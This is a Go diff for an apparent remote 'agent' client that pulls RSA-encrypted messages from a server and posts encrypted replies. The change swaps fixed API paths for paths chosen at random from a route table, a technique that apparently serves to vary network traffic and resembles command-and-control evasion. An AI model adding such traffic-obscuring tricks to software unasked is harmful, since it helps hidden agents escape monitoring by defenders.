@@ -20,7 +20,9 @@ func AgentMessagesSubscribe(agentID string, decryptionKey *rsa.PrivateKey, messa
 		return ErrKeyIsNil
 	}
 
-	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/messages/live/"+agentID, nil)
+	endpointPaths := RouteMap[R_FETCH_MESSAGES_LIVE]
+	endpointPath := randElem(&endpointPaths)
+	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/"+endpointPath+"/"+agentID, nil)
 	if err != nil {
 		return err
 	}
@@ -108,7 +110,9 @@ func AgentFetchMessages(agentID string, decryptionKey *rsa.PrivateKey) (messages
 		return nil, ErrKeyIsNil
 	}
 
-	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/messages/"+agentID, nil)
+	endpointPaths := RouteMap[R_FETCH_MESSAGES]
+	endpointPath := randElem(&endpointPaths)
+	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/"+endpointPath+"/"+agentID, nil)
 	if err != nil {
 		return nil, err
 	}
@@ -167,7 +171,9 @@ func AgentRespondToMessage(messageID, pipelineExecutionID, response string) (err
 		return err
 	}
 
-	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/respond", bytes.NewBuffer([]byte(encrypted)))
+	endpointPaths := RouteMap[R_MESSAGE_RESPOND]
+	endpointPath := randElem(&endpointPaths)
+	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/"+endpointPath, bytes.NewBuffer([]byte(encrypted)))
 	if err != nil {
 		return err
 	}
